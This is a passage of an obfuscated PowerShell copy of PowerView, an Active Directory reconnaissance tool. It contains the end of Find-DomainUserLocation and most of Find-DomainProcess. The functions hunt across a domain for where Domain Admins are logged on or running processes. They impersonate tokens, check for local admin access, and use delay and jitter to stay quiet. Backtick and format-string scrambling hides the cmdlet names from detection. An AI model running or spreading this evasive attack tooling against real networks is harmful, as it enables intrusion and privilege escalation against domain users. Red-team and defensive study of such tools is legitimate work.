            ${g`Ro`UPse`ArcHeRA`Rg`UMEnts} = @{
                'Identity' = ${u`s`ERGRou`p`iDENtItY}
                'Recurse' = ${tr`Ue}
            }
            if (${psbo`U`NDPAraM`eTErS}['UserDomain']) { ${GroUpSEa`Rc`h`ERARgum`Ents}['Domain'] = ${usEr`d`O`MaiN} }
            if (${ps`BoUnD`PARa`mEtErS}['UserSearchBase']) { ${Gr`oUpse`AR`ChERA`Rg`UME`NtS}['SearchBase'] = ${UsE`R`sEa`RCH`BASe} }
            if (${p`S`Bo`UnDp`ARameterS}['Server']) { ${gr`oup`SearCHERA`RgU`mEn`Ts}['Server'] = ${S`eR`VEr} }
            if (${ps`BouN`dPa`R`AmeTers}['SearchScope']) { ${gROUPS`eaR`CHE`R`ARGUM`en`Ts}['SearchScope'] = ${se`A`RCHScO`pE} }
            if (${P`S`BOUN`DPArAmE`TE`Rs}['ResultPageSize']) { ${gRoupSEaRcheRa`R`gu`Me`NTs}['ResultPageSize'] = ${rE`sultp`Ag`ESIze} }
            if (${pSBOundp`ARAM`Ete`Rs}['ServerTimeLimit']) { ${Gr`ouPs`eArCH`ErArGu`m`E`Nts}['ServerTimeLimit'] = ${SE`RV`eRTiMeL`imIT} }
            if (${p`SBouND`ParAmETE`Rs}['Tombstone']) { ${G`R`OUPseAR`c`hE`R`ARGuments}['Tombstone'] = ${TOM`B`SToNE} }
            if (${PsBou`ND`pa`RAmet`E`Rs}['Credential']) { ${Gro`U`Pse`ArChEr`Ar`guM`ENts}['Credential'] = ${CRe`De`NT`iAL} }
            ${TArGET`US`eRS} = &("{3}{4}{0}{1}{2}{5}{6}" -f 'i','nGr','ou','Ge','t-Doma','pMemb','er') @GroupSearcherArguments | &("{0}{2}{1}" -f'Sele','-Object','ct') -ExpandProperty ("{1}{0}{2}"-f'r','Membe','Name')
        }

        &("{2}{0}{1}" -f'-Ve','rbose','Write') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)"
        if ((-not ${s`h`owall}) -and (${Ta`RgEtU`S`ers}.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        # the host enumeration block we're using to enumerate all servers
        ${HoS`T`eN`Umbl`ock} = {
            Param(${coM`puT`e`RNamE}, ${tARG`EtU`Sers}, ${cUR`REnTUs`Er}, ${s`TE`ALTH}, ${t`O`KeNh`ANDlE})

            if (${tOkE`N`h`AndlE}) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                ${NU`ll} = &("{2}{0}{3}{1}{5}{6}{7}{4}"-f 'oke-Use','n','Inv','rImperso','n','at','i','o') -TokenHandle ${to`ke`NH`AndlE} -Quiet
            }

            ForEach (${TaRG`E`TCO`MpuT`Er} in ${coMP`Ut`eR`NA`ME}) {
                ${uP} = &("{0}{1}{3}{2}" -f'Test-Co','nn','on','ecti') -Count 1 -Quiet -ComputerName ${TA`Rge`TcoM`PuTeR}
                if (${U`P}) {
                    ${sEs`Si`Ons} = &("{3}{1}{0}{2}{4}"-f'essi','S','o','Get-Net','n') -ComputerName ${TA`RG`E`T`COMpUTeR}
                    ForEach (${SEs`s`ioN} in ${SE`SsI`Ons}) {
                        ${uSeR`NA`Me} = ${Se`Ssi`oN}.UserName
                        ${CNA`Me} = ${Ses`sIon}.CName

                        if (${c`Na`ME} -and ${cn`Ame}.StartsWith('\\')) {
                            ${C`NamE} = ${Cn`AMe}.TrimStart('\')
                        }

                        # make sure we have a result, and ignore computer$ sessions
                        if ((${USeRN`A`Me}) -and (${U`S`e`RNAME}.Trim() -ne '') -and (${USe`R`NAme} -notmatch ${C`Ur`R`ENtuseR}) -and (${USERN`A`mE} -notmatch '\$$')) {

                            if ( (-not ${t`ARG`ETUSers}) -or (${tARgETu`s`ers} -contains ${us`ER`NaME})) {
                                ${userloC`A`TioN} = &("{0}{1}{2}" -f 'N','ew-Obje','ct') ("{1}{2}{0}" -f 'ct','PS','Obje')
                                ${uS`e`Rl`oCa`TiON} | &("{1}{0}{2}"-f'embe','Add-M','r') ("{2}{1}{0}{3}" -f 'opert','tepr','No','y') 'UserDomain' ${n`Ull}
                                ${U`SeRLO`c`Ati`oN} | &("{2}{1}{0}"-f'ber','-Mem','Add') ("{1}{0}{2}{3}" -f'p','Notepro','ert','y') 'UserName' ${USeRnA`Me}
                                ${U`SE`RL`OCatiON} | &("{0}{1}{2}" -f 'Ad','d-Mem','ber') ("{1}{2}{0}"-f 'erty','Notepro','p') 'ComputerName' ${t`A`R`g`etcOMpUteR}
                                ${usERL`OcA`Tion} | &("{2}{1}{0}" -f'er','Memb','Add-') ("{1}{0}{3}{2}"-f 'p','Note','ty','roper') 'SessionFrom' ${cn`AME}

                                # try to resolve the DNS hostname of $Cname
                                try {
                                    ${cN`Amed`Ns`N`AME} = [System.Net.Dns]::GetHostEntry(${Cn`AME}) | &("{1}{2}{0}"-f 't','Select-','Objec') -ExpandProperty ("{2}{0}{1}" -f'o','stName','H')
                                    ${uS`E`RLo`C`ATiON} | &("{1}{0}{3}{2}" -f'd-Me','Ad','ber','m') ("{2}{0}{1}" -f 'oteProp','erty','N') 'SessionFromName' ${Cn`A`mEdN`snA`ME}
                                }
                                catch {
                                    ${uSERlo`CA`T`i`ON} | &("{1}{2}{0}{3}"-f 'e','Ad','d-M','mber') ("{3}{2}{0}{1}"-f 'ePr','operty','t','No') 'SessionFromName' ${N`Ull}
                                }

                                # see if we're checking to see if we have local admin access on this machine
                                if (${C`Hec`KaccE`ss}) {
                                    ${A`D`mIn} = (&("{4}{2}{3}{1}{0}" -f's','inAcces','-','Adm','Test') -ComputerName ${c`NaME}).IsAdmin
                                    ${u`se`RLOcATI`ON} | &("{0}{1}{2}" -f'Ad','d-M','ember') ("{1}{2}{0}" -f'y','Note','propert') 'LocalAdmin' ${A`D`min}.IsAdmin
                                }
                                else {
                                    ${use`R`lOCaTioN} | &("{1}{0}{2}" -f'd','A','d-Member') ("{3}{1}{0}{2}" -f 'roper','tep','ty','No') 'LocalAdmin' ${NU`LL}
                                }
                                ${U`SE`RLoCA`TION}.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                ${UseR`LocAt`I`oN}
                            }
                        }
                    }
                    if (-not ${st`ealTh}) {
                        # if we're not 'stealthy', enumerate loggedon users as well
                        ${LO`g`GEdON} = &("{2}{3}{0}{1}" -f'd','on','G','et-NetLogge') -ComputerName ${t`ARGEtco`m`PuT`Er}
                        ForEach (${uS`eR} in ${lo`g`GedON}) {
                            ${uSer`NaMe} = ${us`er}.UserName
                            ${U`s`ErdomaiN} = ${us`Er}.LogonDomain

                            # make sure wet have a result
                            if ((${User`N`AmE}) -and (${uS`eRN`AmE}.trim() -ne '')) {
                                if ( (-not ${TaRgE`Tus`e`RS}) -or (${tAR`g`eT`UserS} -contains ${US`Er`NAme}) -and (${USER`NA`me} -notmatch '\$$')) {
                                    ${iPaDd`R`eSS} = @(&("{4}{5}{3}{0}{2}{1}" -f'-IPAdd','ss','re','solve','R','e') -ComputerName ${tAR`getCOmPUT`ER})[0].IPAddress
                                    ${U`SErlO`CaTiOn} = &("{1}{2}{0}"-f 't','Ne','w-Objec') ("{0}{2}{1}"-f 'PS','ct','Obje')
                                    ${Us`ERlo`cA`TION} | &("{2}{0}{1}" -f 'dd-Me','mber','A') ("{2}{3}{0}{1}"-f'rt','y','Not','eprope') 'UserDomain' ${usE`Rd`omaiN}
                                    ${us`erl`O`cA`TiOn} | &("{3}{2}{1}{0}"-f'r','embe','d-M','Ad') ("{0}{3}{2}{1}" -f 'N','ty','eproper','ot') 'UserName' ${u`Se`RnaMe}
                                    ${Use`R`LocaT`i`oN} | &("{1}{2}{0}{3}" -f 'embe','A','dd-M','r') ("{3}{2}{1}{0}" -f'ty','proper','te','No') 'ComputerName' ${TaRG`etcOmp`UT`er}
                                    ${US`ErloCA`TiOn} | &("{1}{0}{2}"-f'em','Add-M','ber') ("{2}{0}{3}{1}"-f'r','ty','Notep','oper') 'IPAddress' ${I`p`ADdreSS}
                                    ${UseRlo`CaTI`On} | &("{1}{2}{0}{3}" -f 'm','Add-','Me','ber') ("{1}{2}{0}{3}" -f'prop','N','ote','erty') 'SessionFrom' ${nu`LL}
                                    ${us`ERlO`CaTiON} | &("{2}{0}{1}" -f'd-Me','mber','Ad') ("{3}{2}{0}{1}"-f'propert','y','e','Not') 'SessionFromName' ${nU`LL}

                                    # see if we're checking to see if we have local admin access on this machine
                                    if (${cHEcKA`CCe`ss}) {
                                        ${A`DMin} = &("{0}{2}{1}"-f'Test-Admin','ss','Acce') -ComputerName ${tArge`TcOMp`UT`eR}
                                        ${Us`ER`lOc`At`iON} | &("{3}{1}{0}{2}"-f 'b','d-Mem','er','Ad') ("{0}{3}{2}{1}" -f'No','perty','epro','t') 'LocalAdmin' ${aD`MIn}.IsAdmin
                                    }
                                    else {
                                        ${UseRL`o`CA`TI`On} | &("{3}{2}{1}{0}" -f 'r','be','-Mem','Add') ("{0}{2}{1}" -f 'Notep','perty','ro') 'LocalAdmin' ${N`ULL}
                                    }
                                    ${us`ErLoc`A`TIon}.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    ${US`E`R`LOCAt`iOn}
                                }
                            }
                        }
                    }
                }
            }

            if (${TO`Ke`NhaNdLE}) {
                &("{1}{4}{2}{3}{0}"-f'lf','In','vertT','oSe','voke-Re')
            }
        }

        ${LO`GO`NtokeN} = ${Nu`LL}
        if (${ps`B`Oundpa`Ramet`ers}['Credential']) {
            if (${Ps`Bo`UN`dparAmEtERs}['Delay'] -or ${PS`BOUnDp`AR`AMEt`ERS}['StopOnSuccess']) {
                ${Log`ONtOk`EN} = &("{1}{4}{0}{5}{2}{3}"-f 'UserI','I','rs','onation','nvoke-','mpe') -Credential ${cR`EDENT`I`Al}
            }
            else {
                ${LO`g`OntOKen} = &("{5}{1}{2}{4}{6}{3}{0}{7}" -f'son','vok','e-U','r','s','In','erImpe','ation') -Credential ${c`REDenTI`Al} -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if (${Psb`OUnDParaMEt`E`Rs}['Delay'] -or ${psB`O`U`NDParaM`E`Ters}['StopOnSuccess']) {

            &("{2}{1}{0}"-f 'rbose','-Ve','Write') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
            &("{1}{0}{2}" -f 'os','Write-Verb','e') "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
            ${C`OunT`eR} = 0
            ${Ran`D`NO} = &("{0}{1}{2}"-f 'N','ew-','Object') ("{2}{3}{1}{0}" -f 'Random','tem.','S','ys')

            ForEach (${tAR`ge`T`COMp`UTer} in ${ta`RgETCO`mP`UtErs}) {
                ${CoU`N`Ter} = ${COu`N`TEr} + 1

                # sleep for our semi-randomized interval
                &("{3}{1}{0}{2}" -f'-Slee','rt','p','Sta') -Seconds ${r`AndNo}.Next((1-${j`I`TTEr})*${DE`LaY}, (1+${J`i`TteR})*${De`L`Ay})

                &("{1}{2}{0}{3}" -f '-V','Wr','ite','erbose') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                &("{3}{1}{0}{2}" -f'an','e-Comm','d','Invok') -ScriptBlock ${HOSten`U`M`BlO`CK} -ArgumentList ${T`ARGETc`O`MPut`ER}, ${targe`TuS`ERs}, ${CUrrE`NT`USER}, ${STe`A`Lth}, ${lOGON`TOK`eN}

                if (${RE`Su`Lt} -and ${S`T`opONS`Uc`CeSs}) {
                    &("{1}{2}{3}{0}" -f'bose','Write','-Ve','r') "[Find-DomainUserLocation] Target user found, returning early"
                    return
                }
            }
        }
        else {
            &("{0}{2}{3}{1}" -f 'Wr','se','ite-Ve','rbo') "[Find-DomainUserLocation] Using threading with threads: $Threads"
            &("{0}{3}{1}{2}" -f 'W','s','e','rite-Verbo') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            ${scR`IptPara`Ms} = @{
                'TargetUsers' = ${ta`R`getU`seRS}
                'CurrentUser' = ${Cur`R`e`NtusEr}
                'Stealth' = ${Ste`A`LtH}
                'TokenHandle' = ${LOgON`T`okeN}
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            &("{3}{2}{0}{1}"-f'eadedFunct','ion','w-Thr','Ne') -ComputerName ${taRG`ET`C`omP`UTERS} -ScriptBlock ${hOstenU`MbL`OCK} -ScriptParameters ${SCri`PTPara`Ms} -Threads ${tH`REa`dS}
        }
    }

    END {
        if (${lOGoN`TOk`en}) {
            &("{2}{1}{3}{5}{0}{4}"-f 'vertT','v','In','oke-','oSelf','Re') -TokenHandle ${lO`G`OnTOk`En}
        }
    }
}


function FIN`D`-DOm`AIN`PR`OCEss {
<#
.SYNOPSIS

Searches for processes on the domain using WMI, returning processes
that match a particular user specification or process name.

Thanks to @paulbrandau for the approach idea.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
function enumerates any current processes running with Get-WMIProcess,
searching for processes running under any target user contexts or with the
specified -ProcessName. If -Credential is passed, it is passed through to
the underlying WMI commands used to enumerate the remote machines.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER ProcessName

Search for processes with one or more specific names.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainProcess

Searches for processes run by 'Domain Admins' by enumerating every computer in the domain.

.EXAMPLE

Find-DomainProcess -UserAdminCount -ComputerOperatingSystem 'Windows 7*' -Domain dev.testlab.local

Enumerates Windows 7 computers in dev.testlab.local and returns any processes being run by
privileged users in dev.testlab.local.

.EXAMPLE

Find-DomainProcess -ProcessName putty.exe

Searchings for instances of putty.exe running on the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainProcess -Domain testlab.local -Credential $Cred

Searches processes being run by 'domain admins' in the testlab.local using the specified alternate credentials.

.OUTPUTS

PowerView.UserProcess
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`Rue}, ValueFromPipelineByPropertyName = ${TR`UE})]
        [Alias('DNSHostName')]
        [String[]]
        ${coMpu`TeRNA`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OmaIN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Comput`Er`dO`M`AiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${COm`PuTeRLDaPfI`L`TER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CO`mPuTERS`e`ARCHBaSE},

        [Alias('Unconstrained')]
        [Switch]
        ${C`OMpUTeR`UNC`oN`straiNED},

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        ${co`MPu`T`e`ROpEr`ATINGSyST`em},

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        ${c`o`MPuTe`RsErVI`c`EP`ACk},

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        ${C`o`MpUTersITE`N`A`mE},

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${prO`C`esSnA`Me},

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${USErId`eNt`i`Ty},

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Use`RDo`MAin},

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${US`Er`LdaP`FIlTEr},

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        ${usER`seA`Rchb`A`sE},

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        ${USer`gr`Ou`PI`denTi`TY} = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        ${userA`DM`IncOuNt},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`R`VeR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`e`ARchscOpe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSULTPa`ge`S`IZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`V`e`RtiMeli`miT},

        [Switch]
        ${t`OMBs`T`oNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EdeNtIAL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${SToP`onSuC`CeSS},

        [ValidateRange(1, 10000)]
        [Int]
        ${De`lAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`itt`ER} = .3,

        [Int]
        [ValidateRange(1, 100)]
        ${ThR`eads} = 20
    )

    BEGIN {
        ${CompuTErsEar`che`RA`RGumeN`TS} = @{
            'Properties' = 'dnshostname'
        }
        if (${pS`BoUNd`pArAM`ETe`Rs}['Domain']) { ${C`OMpUT`erSeArcHEra`Rg`UMents}['Domain'] = ${DOMA`iN} }
        if (${PsBoUnDp`A`R`A`MeTe`RS}['ComputerDomain']) { ${C`O`mPut`E`Rs`eAr`cHeRaRGUM`ents}['Domain'] = ${c`oM`PUtERDOma`in} }
        if (${PSBOuND`pa`RA`m`e`TeRs}['ComputerLDAPFilter']) { ${CoMpuTER`sE`ARCHEra`R`G`UMEN`Ts}['LDAPFilter'] = ${Co`mP`UtErlD`APf`ilTEr} }
        if (${Ps`B`oundPa`RAm`EteRs}['ComputerSearchBase']) { ${ComPUterS`eARChErAR`Gu`m`En`TS}['SearchBase'] = ${c`OmpU`TERseaR`ChbaSe} }
        if (${PS`B`oUndpA`RamETERS}['Unconstrained']) { ${Co`m`PuTe`Rsea`RCHERa`RG`UmENTs}['Unconstrained'] = ${unC`o`NsTrai`NED} }
        if (${Ps`B`OUnDPAraMeTe`RS}['ComputerOperatingSystem']) { ${c`o`MPuTer`Se`A`R`CHERArGu`Ments}['OperatingSystem'] = ${OperA`TIn`g`s`YsTem} }
        if (${ps`BO`UNdP`Aramet`e`Rs}['ComputerServicePack']) { ${cOmPuteRs`EaRC`HER`A`R`guMEntS}['ServicePack'] = ${sEr`VIceP`ACk} }
        if (${PsB`o`UndPaR`AMeTeRs}['ComputerSiteName']) { ${C`o`M`puTeRs`eaRcHerAR`GUmentS}['SiteName'] = ${s`itena`mE} }
        if (${p`SbouND`Para`MeTErS}['Server']) { ${cO`Mp`UTE`RseaRC`H`Er`ARgum`eNtS}['Server'] = ${S`ERVer} }
        if (${pSB`o`U`N`DParA`meteRS}['SearchScope']) { ${cOM`p`Uter`seArC`hEraRGuME`NtS}['SearchScope'] = ${SE`ArcHsC`o`pe} }
        if (${P`sbO`UNDPArAMETe`RS}['ResultPageSize']) { ${CoMP`UTerse`A`RcH`e`RARG`UMe`NTs}['ResultPageSize'] = ${resUlTp`Age`si`zE} }
        if (${ps`Bo`UN`dP`ARamE`TErs}['ServerTimeLimit']) { ${Co`M`pUter`s`e`AR`CherarGU`meNTs}['ServerTimeLimit'] = ${sERVertI`ME`L`IMit} }
        if (${P`sboU`NDpaRAmE`TERs}['Tombstone']) { ${cO`Mput`eRSearc`herARGU`MeN`Ts}['Tombstone'] = ${tOmb`sto`NE} }
        if (${PsbOu`Nd`P`AraMete`RS}['Credential']) { ${comp`UTERse`AR`cHERa`Rg`UM`eNTS}['Credential'] = ${cRE`DE`Nt`IAl} }

        ${usErSeaR`chER`Ar`gumENTs} = @{
            'Properties' = 'samaccountname'
        }
        if (${PSb`OUNdPArAmET`E`RS}['UserIdentity']) { ${us`ERS`eA`RcHEraRg`UMENtS}['Identity'] = ${U`SeRi`denT`ItY} }
        if (${Ps`BoUNd`p`ArAMeteRs}['Domain']) { ${uSE`RseaRchERA`R`G`UM`enTs}['Domain'] = ${do`mAIn} }
        if (${P`SB`OUNd`par`AmEte`RS}['UserDomain']) { ${USE`RSEA`RCHeRa`R`guMents}['Domain'] = ${u`SeRdOm`AiN} }
        if (${PsB`o`UN`dPaRa`MEters}['UserLDAPFilter']) { ${usER`SEAr`ChERaRG`UmEn`Ts}['LDAPFilter'] = ${u`SErL`DApfIL`TeR} }
        if (${P`sB`ouNdpa`RAmeTErs}['UserSearchBase']) { ${uS`Ers`e`A`RcheraRGu`M`eNts}['SearchBase'] = ${use`RS`EAR`ch`Base} }
        if (${PSBOU`Ndp`A`R`AMeTers}['UserAdminCount']) { ${USeRsE`Ar`ChER`AR`gU`Me`NTs}['AdminCount'] = ${uSeRAD`mI`N`cOUNT} }
        if (${ps`Bo`UN`DpaRA`mEtErs}['Server']) { ${use`RsEaRch`era`RguMeNTs}['Server'] = ${serV`er} }
        if (${PsbOun`Dpa`RaMET`E`Rs}['SearchScope']) { ${usEr`s`EArchERA`R`gUMeNts}['SearchScope'] = ${sEA`RC`HsCO`pE} }
        if (${p`SBOU`NdParAME`T`ErS}['ResultPageSize']) { ${u`s`ErSEARchEr`A`RgumeNTs}['ResultPageSize'] = ${Resu`LTP`A`GEsIzE} }
        if (${Ps`BouNDPARa`MEte`Rs}['ServerTimeLimit']) { ${UseRSEa`RcH`ErAr`Gu`MenTs}['ServerTimeLimit'] = ${se`RVeRTI`M`e`lI`mIt} }
        if (${P`sBOun`DpaRa`M`ET`eRS}['Tombstone']) { ${Use`Rse`AR`Ch`Er`ArgumENtS}['Tombstone'] = ${TO`MBST`OnE} }
        if (${PSb`oUn`Dp`ARAMeteRs}['Credential']) { ${U`SERsEarCHE`RArGU`m`ENtS}['Credential'] = ${crE`deNti`Al} }


        # first, build the set of computers to enumerate
        if (${psb`OunD`pAR`AmeTErS}['ComputerName']) {
            ${TARGETCo`M`P`UTERS} = ${coM`P`UTErNamE}
        }
        else {
            &("{2}{1}{0}" -f'se','te-Verbo','Wri') '[Find-DomainProcess] Querying computers in the domain'
            ${tArG`e`TCOMPu`TeRs} = &("{0}{5}{4}{1}{2}{3}"-f 'Get-D','nCo','m','puter','ai','om') @ComputerSearcherArguments | &("{0}{2}{1}"-f 'Select-','t','Objec') -ExpandProperty ("{0}{3}{1}{2}"-f 'dnsho','a','me','stn')
        }
        &("{0}{3}{1}{2}"-f 'Write','Ver','bose','-') "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
        if (${tar`Ge`TcoMPute`RS}.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }

        # now build the user target set
        if (${psbOUn`D`PaRAM`et`ERs}['ProcessName']) {
            ${T`AR`GETpro`ceSsNa`Me} = @()
            ForEach (${t} in ${ProcesSn`A`me}) {
                ${ta`RG`E`TPrOc`EsSNaMe} += ${T}.Split(',')
            }
            if (${TaRGEtPR`oC`esS`Na`Me} -isnot [System.Array]) {
                ${t`AR`geTp`ROcEsSNa`Me} = [String[]] @(${TaRg`eT`prOCe`SsnAmE})
            }
        }
        elseif (${PSboU`NDp`Ara`m`EtERs}['UserIdentity'] -or ${psB`ouNdPARamET`e`Rs}['UserLDAPFilter'] -or ${P`SbOunDPA`R`AmETErS}['UserSearchBase'] -or ${Ps`B`o`UndpArAMETe`Rs}['UserAdminCount'] -or ${p`SBo`UndpaRa`meTerS}['UserAllowDelegation']) {
            ${TaRG`e`T`UserS} = &("{2}{3}{0}{1}" -f 'nUs','er','Get','-Domai') @UserSearcherArguments | &("{2}{3}{4}{0}{1}" -f 'ct-','Object','Se','l','e') -ExpandProperty ("{2}{4}{0}{3}{1}" -f'oun','me','sam','tna','acc')
        }
        else {
            ${GRO`U`p`SEARCHEra`R`gU`MEnts} = @{
                'Identity' = ${USeRGrOuPi`dE`N`TItY}
                'Recurse' = ${tR`UE}
            }
            if (${pS`BOun`dp`AraMETers}['UserDomain']) { ${grOU`PSe`AR`CH`eRa`RGume`NTs}['Domain'] = ${Use`R`DOMain} }
            if (${p`sBOUN`dPArA`mEte`Rs}['UserSearchBase']) { ${G`R`OUpse`ARcH`EraRgUme`NTS}['SearchBase'] = ${USer`Se`AR`C`hBAsE} }
            if (${pSBoUnd`pA`R`AMeTERs}['Server']) { ${grO`Up`SE`Arc`HE`RargUMe`NTs}['Server'] = ${S`Er`VeR} }
            if (${ps`BoUN`dPARame`T`ERS}['SearchScope']) { ${g`ROupSEa`R`c`hEr`ArGu`MeNTS}['SearchScope'] = ${S`e`ARchS`cOPe} }
            if (${pSBoundp`ARaM`Et`E`Rs}['ResultPageSize']) { ${gRO`UpSEArchE`RAR`GU`mE`Nts}['ResultPageSize'] = ${re`S`UlTP`AGEsiZE} }
            if (${P`sBOuNd`paRam`eTeRS}['ServerTimeLimit']) { ${GRouPS`eaRCHeRaR`Gu`m`e`NtS}['ServerTimeLimit'] = ${s`eRVE`Rt`im`eliMIT} }
            if (${PsboU`Ndp`A`RamETeRs}['Tombstone']) { ${gR`OuP`sEARcH`E`RARGuMEN`Ts}['Tombstone'] = ${TOMb`St`onE} }
            if (${PsbOuN`d`PAR`Am`eTers}['Credential']) { ${groUp`SEar`cHE`Ra`RgUMentS}['Credential'] = ${cRedE`Nt`i`AL} }
            ${GROup`S`earcHe`RA`RGUMeN`TS}
            ${TarGEt`U`SeRs} = &("{0}{1}{3}{4}{2}"-f'G','et-Domain','pMember','Gr','ou') @GroupSearcherArguments | &("{2}{1}{0}" -f't','elect-Objec','S') -ExpandProperty ("{0}{1}{2}"-f 'M','embe','rName')
        }

        # the host enumeration block we're using to enumerate all servers
        ${H`Os`TE`NumbLOCK} = {
            Param(${com`pUt`erNAME}, ${P`ROCEs`sNAMe}, ${t`ArGE`Tu`SerS}, ${cRedEn`Ti`AL})

            ForEach (${ta`RgEtC`o`mpUT`Er} in ${ComPUt`ERnA`me}) {
                ${u`P} = &("{3}{1}{0}{2}{4}"-f'-Connect','t','i','Tes','on') -Count 1 -Quiet -ComputerName ${ta`RgetcOm`pU`TeR}
                if (${up}) {
                    # try to enumerate all active processes on the remote host
                    # and search for a specific process name
                    if (${cREd`E`N`TIal}) {
                        ${pRoCe`s`sES} = &("{2}{4}{3}{0}{1}"-f'e','ss','G','c','et-WMIPro') -Credential ${cr`eDeN`TiaL} -ComputerName ${T`ARget`coMpuT`eR} -ErrorAction ("{2}{3}{0}{1}" -f 'tinu','e','S','ilentlyCon')
                    }
                    else {
                        ${pR`OCEss`ES} = &("{4}{2}{0}{1}{3}" -f 'IP','roce','M','ss','Get-W') -ComputerName ${TargEt`C`oM`puTEr} -ErrorAction ("{2}{3}{1}{4}{0}" -f'nue','ont','S','ilentlyC','i')
                    }
                    ForEach (${Pro`ce`sS} in ${pRo`cE`SSes}) {
                        # if we're hunting for a process name or comma-separated names
                        if (${proCE`S`SN`AmE}) {
